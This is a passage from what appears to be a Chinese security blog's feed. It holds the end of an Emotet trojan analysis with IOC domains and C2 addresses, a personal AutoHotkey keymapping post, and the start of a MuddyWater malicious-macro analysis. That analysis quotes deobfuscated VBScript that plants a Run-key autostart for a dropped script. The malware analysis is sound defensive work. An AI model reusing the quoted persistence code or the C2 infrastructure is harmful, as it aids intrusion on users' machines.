alt="image.png"></p><p>根据<code>PE</code>偏移,获取各个节的数据.</p><p><img src="https://i.loli.net/2019/10/20/ZqJdnRFG1a58zuL.png" alt="image.png"></p></li><li><p>申请空间</p><p><img src="https://i.loli.net/2019/10/20/BnvoZT7Qj2tHrcl.png" alt="image.png"></p></li><li><p>拷贝后门程序<code>pe</code>数据.这时候顺便去dump内存被复制的pe数据,(毕竟可能不用修复重定位(x).</p><p><img src="https://i.loli.net/2019/10/21/sag2pfOBJl4Xjer.png" alt="age.png">得知程序入口RVA为<code>0x1000</code>, 基地址为<code>0x60000</code>,所以起始地址为<code>0x610000</code>,块大小为<code>D200</code></p></li><li><p>内存页属性修改</p><p>修改代码段为可执行可读属性.</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p><p>​    修改数据段为可读属性</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p></li><li><p>执行新pe文件的代码段,这时候顺便dump下来pe数据.</p><p><img src="https://i.loli.net/2019/10/21/iqM9bLgCnea3HZd.png" alt="image.png"></p></li></ol><h6 id="0x04-内存pe执行"><a href="#0x04-内存pe执行" class="headerlink" title="0x04 内存pe执行"></a>0x04 内存pe执行</h6><ol><li><p>拷贝数据</p><p><img src="https://i.loli.net/2019/10/22/USjyGrmZscb65WH.png" alt="image.png"></p></li><li><p>获取模块全称和地址</p><p><img src="https://i.loli.net/2019/10/21/zDvtGSpbCxBrAh4.png" alt="image.png"></p></li><li><p>计算key</p><p><img src="https://i.loli.net/2019/10/22/KomgIQ1Cl3J62Fr.png" alt="image.png"></p></li><li><p>格式化参数</p><p><img src="https://i.loli.net/2019/10/22/pxGhAcSVIn1gHmb.png" alt="image.png"></p></li><li><p>计算出的命令行参数和从右往左取现有命令行进行比较,如果命令相等则执行内部函数.不相等的话执行下列流程</p><p><img src="https://i.loli.net/2019/10/21/xtZ1VL8AzhvXHbi.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/gbc4lvu9BhtA6qJ.png" alt="image.png"></p></li><li><p>不相等后</p><p>执行后续程序,最终<code>CreateProcessW</code></p><p>创建新的自身进程并附加对应计算出的命令参数:<br><img src="https://i.loli.net/2019/10/21/Nto42xPCwM19S8z.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/qTyEN2M5O3VaxkF.png" alt="image.png"></p></li><li><p>退出进程</p><p><img src="https://i.loli.net/2019/10/21/E41zgYRTi3nZJyG.png" alt="image.png"></p></li></ol><h6 id="0x05-主要功能"><a href="#0x05-主要功能" class="headerlink" title="0x05 主要功能"></a>0x05 主要功能</h6><h6 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2019/10/21/gTuZNbcDyrnVJEf.png" alt="image.png"></h6><p>使用上述的命令行字符串进行调试,这时候为了方便使用之前解密后dump下来的pe数据.</p><p>二者字符串相等进入<code>sub_30B8AB</code>.</p><p><img src="https://i.loli.net/2019/10/24/XSZhrkpJOo4zIFB.png" alt="image.png"></p><p>通过互斥量执行主要功能函数函数,等待<code>4000ms</code></p><p><img src="https://i.loli.net/2019/10/24/BcQegxCy5mJIvq8.png" alt="image.png"></p><p>功能大致分布区域,通过对固定内存空间的值进行校验赋值,依次执行不同功能</p><ol><li><p>系统进程获取</p><p><img src="https://i.loli.net/2019/10/24/tYqLebN5KmjS3lT.png" alt="image.png"></p><p><code>sub_302255</code><img src="https://i.loli.net/2019/10/24/SdyeljR6A5rpo8O.png" alt="image.png"></p><p>进程名存储:<img src="https://i.loli.net/2019/10/23/lM42Ns8oqFrZOHh.png" alt="image.png"></p></li><li><p>信息发送</p><p><img src="https://i.loli.net/2019/10/24/FatXzjZlEN9Lco6.png" alt="image.png"></p><p>发送流程</p><p><img src="https://i.loli.net/2019/10/24/T6hCc8joDS2UHwg.png" alt="image.png"></p></li><li><p>注册自启动</p><p><img src="https://i.loli.net/2019/10/24/I5HK64yL21sqhNm.png" alt="image.png"></p></li><li><p>新文件</p><p><img src="https://i.loli.net/2019/10/24/jYRchepluf3CWEO.png" alt="image.png"></p><p>启动<img src="https://i.loli.net/2019/10/24/21x6OJq9XuA4zwN.png" alt="image.png"></p></li><li><p>令牌获取</p><p><img src="https://i.loli.net/2019/10/24/cJhGPRE3abTzV2W.png" alt="image.png"></p><p>高权限执行</p><p><img src="https://i.loli.net/2019/10/24/K4S9RY8EmUjawpk.png" alt="image.png"></p></li><li><p>移动文件</p><p><img src="https://i.loli.net/2019/10/24/p9lZFEDwT8HWtq2.png" alt="image.png"></p><p>使用<code>SHFileOperationW</code>操作文件</p><p><img src="https://i.loli.net/2019/10/24/cFmnrQpLTHCx4IU.png" alt="image.png"></p></li></ol><h3 id="四-dasmrcdasmrc-exe"><a href="#四-dasmrcdasmrc-exe" class="headerlink" title="四. dasmrcdasmrc.exe"></a>四. dasmrcdasmrc.exe</h3><p>位置: %localappdata%\dasmrcdasmrc\dasmrcdasmrc.exe</p><p>名称: dasmrcdasmrc.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p> 和846同一文件,并执行了木马函数.</p><h2 id="0x05-恶意ip"><a href="#0x05-恶意ip" class="headerlink" title="0x05 恶意ip"></a>0x05 恶意ip</h2><p>通过<code>fiddler</code>,发包可知恶意流量ip地址.</p><p><img src="https://i.loli.net/2019/10/21/VB3IYgWGQEMzi6y.png" alt></p><h2 id="0x06-IOC"><a href="#0x06-IOC" class="headerlink" title="0x06 IOC"></a>0x06 IOC</h2><p>MD5</p><p>b72f31807db78e70eb2c45993dd2a4e1 </p><p>e83c5ba6be05ec51ae6ceb2470fcfdf3</p><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><table><thead><tr><th><a href="javascript:" target="_blank" rel="noopener">complaintboardonline.com</a></th><th><a href="http://ip.tool.chinaz.com/?ip=35.200.131.105" target="_blank" rel="noopener">35.200.131.105</a></th></tr></thead><tbody><tr><td><a href="javascript:" target="_blank" rel="noopener">watonlight.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=144.34.202.247" target="_blank" rel="noopener">144.34.202.247</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">frazischool.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.241.24.165" target="_blank" rel="noopener">103.241.24.165</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">sagarngofoundation.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=35.154.167.80" target="_blank" rel="noopener">35.154.167.80</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">naturerepublickh.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.91.65.133" target="_blank" rel="noopener">103.91.65.133</a></td></tr></tbody></table><table><thead><tr><th>http:\\</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>14.160.93.230</td><td style="text-align:center">/forced/ringin/</td></tr><tr><td>74.208.68.48:8080</td><td style="text-align:center">/attrib/srvc/symbols/merge/</td></tr><tr><td>104.131.58.132:8080</td><td style="text-align:center">/report/publish/symbols/merge/</td></tr><tr><td>68.183.190.199:8080</td><td style="text-align:center">/xian/schema/symbols/merge/</td></tr><tr><td>62.75.143.100:7080</td><td style="text-align:center">/report/</td></tr><tr><td>159.203.204.126:8080</td><td style="text-align:center">/devices/mult/</td></tr><tr><td>151.80.142.33</td><td style="text-align:center">/symbols/enable/symbols/</td></tr><tr><td>123.168.4.66:22</td><td style="text-align:center">/report/iplk/</td></tr><tr><td>46.28.111.142:7080</td><td style="text-align:center">/merge/psec/symbols/merge/</td></tr><tr><td>46.101.212.195:8080</td><td style="text-align:center">/symbols/badge/</td></tr><tr><td>183.82.97.25</td><td style="text-align:center">/between/balloon/symbols/merge/</td></tr><tr><td>190.10.194.42:8080</td><td style="text-align:center">/balloon/health/symbols/merge/</td></tr><tr><td>217.199.160.224:8080</td><td style="text-align:center">/json/site/</td></tr><tr><td>186.1.41.111:443</td><td style="text-align:center">/bml/splash/symbols/merge/</td></tr><tr><td>185.86.148.222:8080</td><td style="text-align:center">/results/teapot/symbols/</td></tr><tr><td>185.187.198.10:8080</td><td style="text-align:center">/results/walk/</td></tr><tr><td>200.57.102.71:8443</td><td style="text-align:center">/scripts/</td></tr><tr><td>114.79.134.129:443</td><td style="text-align:center">/guids/</td></tr></tbody></table><h2 id="学习链接与资源"><a href="#学习链接与资源" class="headerlink" title="学习链接与资源"></a>学习链接与资源</h2><p><a href="https://github.com/Xuwei98/malware-analysis/tree/master/Trojan/2019-10-18-word-pe木马" target="_blank" rel="noopener">样本和idb放这里了</a></p><p><a href="https://green-m.me/2018/04/26/find-api-adress-by-hash/" target="_blank" rel="noopener">通过Hash查找API函数地址</a></p><p><a href="https://blog.csdn.net/anda0109/article/details/50013523" target="_blank" rel="noopener">CryptoAPI</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2019-11-07&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ioc&lt;/code&gt;规则提交给微步时,顺便把恶意&lt;code&gt;ip&lt;/code&gt;搜索了一下,发现&lt;code&gt;Emotet&lt;/code&gt;银行木马家族.&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;记录一下最近分析的一个样本,自己依然是个菜鸡,有很多不足,希望各位师傅提出错误我努力学习.我头发都没了.此木马发送用户信息加密,能进行远程后门访问等功能,导入函数和导出函数只有一个,大量的动态加载api. &lt;/p&gt;
&lt;p&gt;idb和样本都放下面学习链接那了.&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="宏代码" scheme="http://blog.dgmddw.xyz/tags/%E5%AE%8F%E4%BB%A3%E7%A0%81/"/>
    
      <category term="PowerShell" scheme="http://blog.dgmddw.xyz/tags/PowerShell/"/>
    
      <category term="VC" scheme="http://blog.dgmddw.xyz/tags/VC/"/>
    
  </entry>
  
  <entry>
    <title>Autohotkey脚本,自用</title>
    <link href="http://blog.dgmddw.xyz/2019/10/17/2019-10-17-autohotkey/"/>
    <id>http://blog.dgmddw.xyz/2019/10/17/2019-10-17-autohotkey/</id>
    <published>2019-10-16T16:00:00.000Z</published>
    <updated>2020-02-27T08:45:30.866Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="注册表切换键位"><a href="#注册表切换键位" class="headerlink" title="注册表切换键位"></a>注册表切换键位</h3><p><code>Esc</code>和<code>CapsLock</code>相互映射.在任何键盘都是可以使用的.毕竟注册表优先级更高.</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>本质来说是使用注册表中的扫描码映射<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</code></p><p><code>Esc</code>和<code></code>CapsLock`相互映射,可以这样写:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</span><br><span class="line"> <span class="string">"Scancode Map"</span>=hex:<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">03</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span></span><br></pre></td></tr></table></figure><p>当然原理是这样的,我是用的是<code>SharpKeys</code>,开源链接在下方.</p><h3 id="AutoHotKey"><a href="#AutoHotKey" class="headerlink" title="AutoHotKey"></a>AutoHotKey</h3><p>使用软件<code>AutoHotKey</code>进行热键设置,下面是我现在使用的脚本.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">; + shift</span><br><span class="line">; ! Alt</span><br><span class="line">; ^ crtl</span><br><span class="line">; # win</span><br><span class="line"></span><br><span class="line">^F10::</span><br><span class="line">Send &#123;Volume_Down&#125;</span><br><span class="line">return</span><br><span class="line">^F11::</span><br><span class="line">Send &#123;Volume_Up &#125;</span><br><span class="line">Return</span><br><span class="line">^F12::</span><br><span class="line">Send &#123;Volume_Mute&#125;</span><br><span class="line">Return</span><br><span class="line"></span><br><span class="line">Esc::Send, &#123;Esc&#125;</span><br><span class="line">;方向键映射</span><br><span class="line"></span><br><span class="line">Esc &amp; h::Send, &#123;Left&#125;</span><br><span class="line">Esc &amp; j::Send, &#123;Down&#125;</span><br><span class="line">Esc &amp; k::Send, &#123;Up&#125;</span><br><span class="line">Esc &amp; l::Send, &#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;单词移动</span><br><span class="line">Esc &amp; o::Send, ^&#123;left&#125;</span><br><span class="line">Esc &amp; p::Send, ^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;翻页</span><br><span class="line">Esc &amp; &apos;::Send, &#123;PgUp&#125;</span><br><span class="line">Esc &amp; /::Send, &#123;PgDn&#125;</span><br><span class="line"></span><br><span class="line">;选择一个单词</span><br><span class="line">Esc &amp; y::Send, +^&#123;Left&#125;</span><br><span class="line">Esc &amp; u::Send, +^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line">;选择字符</span><br><span class="line">Esc &amp; n::Send, ^&#123;Left&#125;</span><br><span class="line">Esc &amp; m::Send, ^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;选择一行</span><br><span class="line">Esc &amp; [::Send, +&#123;home&#125;</span><br><span class="line">Esc &amp; ]::Send, +&#123;end&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;home</span><br><span class="line">Esc &amp; ,::Send, &#123;home&#125;</span><br><span class="line">;End</span><br><span class="line">Esc &amp; .::Send, &#123;end&#125;</span><br><span class="line"></span><br><span class="line">;窗口移动</span><br><span class="line">Esc &amp; 7::Send, #&#123;Left&#125;</span><br><span class="line">Esc &amp; 0::Send, #&#123;Right&#125;</span><br><span class="line">Esc &amp; 8::Send, #&#123;Down&#125;</span><br><span class="line">Esc &amp; 9::Send, #&#123;Up&#125;</span><br><span class="line"></span><br><span class="line">;删除</span><br><span class="line">Esc &amp; i::Send, &#123;BackSpace&#125;</span><br><span class="line">;刷新</span><br><span class="line">Esc &amp; 5::Send, &#123;f5&#125;</span><br><span class="line"></span><br><span class="line">;任务视窗切换</span><br><span class="line">Esc &amp; g:: Send, ^!&#123;Tab&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;shift+esc</span><br><span class="line">+Esc::Send, +&#123;Esc&#125;</span><br><span class="line"></span><br><span class="line">;虚拟桌面</span><br><span class="line">Esc &amp; t:: Send, #&#123;Tab&#125;</span><br><span class="line">Esc &amp; d:: Send, #^d</span><br><span class="line">Esc &amp; f4:: Send, #^&#123;f4&#125;</span><br><span class="line">Esc &amp; v:: Send, #^&#123;left&#125;</span><br><span class="line">Esc &amp; b:: Send, #^&#123;right&#125;</span><br><span class="line"></span><br><span class="line">;置顶</span><br><span class="line">#t::</span><br><span class="line">WinSet AlwaysOnTop,On,A</span><br><span class="line">return</span><br><span class="line">#^t::</span><br><span class="line">WinSet AlwaysOnTop,Off,A</span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">;关闭窗口</span><br><span class="line">Esc &amp; x:: Send, ^&#123;F4&#125;</span><br><span class="line">Esc &amp; 4:: Send, !&#123;f4&#125;</span><br><span class="line"></span><br><span class="line">;Enter</span><br><span class="line">Esc &amp; E:: Send, &#123;Enter&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://yanzhantao.com/windows-scancode-map.html" target="_blank" rel="noopener">https://yanzhantao.com/windows-scancode-map.html</a></p><p><a href="https://github.com/randyrants/sharpkeys" target="_blank" rel="noopener">https://github.com/randyrants/sharpkeys</a></p><p><a href="https://www.autohotkey.com/" target="_blank" rel="noopener">https://www.autohotkey.com/</a></p><p><a href="https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm" target="_blank" rel="noopener">https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://blog.dgmddw.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Autohotkey" scheme="http://blog.dgmddw.xyz/tags/Autohotkey/"/>
    
  </entry>
  
  <entry>
    <title>MuddyWater(污水) APT样本分析</title>
    <link href="http://blog.dgmddw.xyz/2019/10/06/2019-10-06-MuddyWater(%E6%B1%A1%E6%B0%B4)%20APT%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/</id>
    <published>2019-10-05T16:00:00.000Z</published>
    <updated>2020-03-07T13:17:54.983Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方.</p><p>参考与学习的地址为:<a href="https://bbs.pediy.com/thread-252477.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252477.htm</a></p><p>脚本类恶意程序分析技巧汇总:<a href="https://bbs.pediy.com/thread-251102.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251102.htm</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/8659004.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/8659004.html</a></p><p>谢谢师傅的分析文章.</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>微步在线搜寻md5=6cb076f1f42573c5c43083a89bcfe442,下载样本文件并且改名.虚拟机使用<code>Office Tool Plus</code>安装office.</p><p>使用hashcalc:    </p><a id="more"></a><table><thead><tr><th style="text-align:left">SHA1</th><th>4e68e2040acade6369d938f96c95ada050a8e061</th></tr></thead><tbody><tr><td style="text-align:left">SHA-256</td><td>36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</td></tr></tbody></table><h3 id="恶意宏代码"><a href="#恶意宏代码" class="headerlink" title="恶意宏代码"></a>恶意宏代码</h3><p><code>OfficeMalScanner.exe  &quot;Zakupki_Agency on Public Procurement.doc&quot;  info</code>提取宏汇编,<code>atl+F11</code>打开VBA编辑器然后启动内容也可以.</p><p>五个文件分别是:<img src="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png" alt></p><h4 id="1-ThisDocument"><a href="#1-ThisDocument" class="headerlink" title="1.ThisDocument"></a>1.ThisDocument</h4><p><img src="https://i.loli.net/2019/09/30/hwzPVutOI8raYJH.png" alt="image.png"></p><p>动态调试F8,会跳出UTF-8窗口.跳转到frmLoadr.Show函数内部.</p><h4 id="2-frmLoadr"><a href="#2-frmLoadr" class="headerlink" title="2.frmLoadr"></a>2.frmLoadr</h4><p><img src="https://i.loli.net/2019/09/30/ovtTYUskGDfQr9j.png" alt="image.png"></p><p>按钮调用buttonQWERTY_Click()函数.给RgSH传入参数7.然后动态调试跳转到<code>RgSH(id)函数</code></p><h4 id="3-RgSH-id"><a href="#3-RgSH-id" class="headerlink" title="3. RgSH(id)"></a>3. RgSH(id)</h4><p><img src="https://i.loli.net/2019/10/01/LsIdhwHNiKDA58J.png" alt="image.png"></p><p>根据mlw()函数解密,写一个小脚本就行,再使用MsgBox()打印,这里有个细节oor的时候进行了字符逆序,所以脚本最好添加.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">"""sP = mlw(1353) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1315) &amp; mlw(1338) &amp; mlw(1336) &amp; mlw(1317) &amp; mlw(1335) &amp; mlw(1351)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1318) &amp; mlw(1293) &amp; mlw(1351) &amp; mlw(1343) &amp; mlw(1352) &amp; mlw(1332) &amp; mlw(1337) &amp; mlw(1336) &amp; mlw(1335)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1327) &amp; mlw(1351) &amp; mlw(1346) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1327) &amp; mlw(1281) &amp; mlw(1327) &amp; mlw(1327)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1268) &amp; mlw(1360) &amp; mlw(1336) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1267) &amp; mlw(1296) &amp; mlw(1267) &amp; mlw(1343) &amp; mlw(1336)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1353) &amp; mlw(1336) &amp; mlw(1311) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1340) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349) &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1358) &amp; mlw(1293)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1350) &amp; mlw(1351) &amp; mlw(1344) &amp; mlw(1338) &amp; mlw(1344) &amp; mlw(1345) &amp; mlw(1340) &amp; mlw(1354) """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除多余字符</span></span><br><span class="line">char = char.replace(<span class="string">"sP"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"mlw("</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">")"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">num = char.split(<span class="string">"&amp;"</span>)</span><br><span class="line"><span class="comment">#字符转数字</span></span><br><span class="line">num = list(map(int,num))</span><br><span class="line">chr = []</span><br><span class="line"><span class="comment">#逆序打印 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">num[i] = num[i] <span class="number">-1235</span></span><br><span class="line">print(<span class="string">"chr("</span>+ str(num[i]) +<span class="string">")"</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">"&amp;"</span>,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt="image.png"></p><p>最后所有除掉混淆是这样子的.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> RgSH(id)</span><br><span class="line">b = PuSH(id)</span><br><span class="line">CallByName <span class="string">"winmgmts:&#123;impersonationLevel = impersonate&#125;!\\.\root\default:StdRegProv"</span>, </span><br><span class="line"><span class="string">"SetStringValue"</span>, </span><br><span class="line">VbMethod, </span><br><span class="line">&amp;H80000001, </span><br><span class="line"><span class="string">"Software\Microsoft\Windows\CurrentVersion\Run"</span>, </span><br><span class="line"><span class="string">"VingValue"</span>, </span><br><span class="line"> b</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>然后动态调试后b的值为%Temp%\aulmgr.vbe,其中<code>PuSH(id)</code>函数下面会继续分析</p><p><a href="https://msdn.microsoft.com/ja-jp/windows/aa393600(v=vs.80" target="_blank" rel="noopener">以这个为参考</a>)得出这个函数大概作用是获取本地注册表对象,调用<code>SetStringValue</code>,在注册表项为<code>Software\Microsoft\Windows\CurrentVersion\Run</code>,创建键名为”VingValue”,并设定值为b.</p><h4 id="PuSH-id"><a href="#PuSH-id" class="headerlink" title="PuSH(id)"></a>PuSH(id)</h4><p><img src="![image.png](https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt>)</p><p>传入参数7;</p><p>执行函数<code>p = d3r(4) &amp; FuN(1)</code>.先运行跳过得到<code>p = %TEMP%\aulmgr.vbe</code></p><p>然后进行<code>If id Mod 5 = 1</code>如果id模5得1则进行下面的操作:利用<code>CreateTextFile</code>创建<code>%Temp%\aulmgr.vbe,</code>对象并写入标题拼接1-13拼接出来的ddd字符串.</p><h4 id="d3r-id1"><a href="#d3r-id1" class="headerlink" title="d3r(id1)"></a>d3r(id1)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> d3r(id)</span><br><span class="line"><span class="keyword">Set</span> f = <span class="built_in">CreateObject</span>(<span class="string">"scriPtInG.filesystemObJEct"</span>)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">d3r = Environ$(<span class="string">"puBLiC"</span>)获取<span class="string">"public"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">d3r = Environ$(<span class="string">"aPpDaTa"</span>)  获取<span class="string">"aPpDaTa"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span 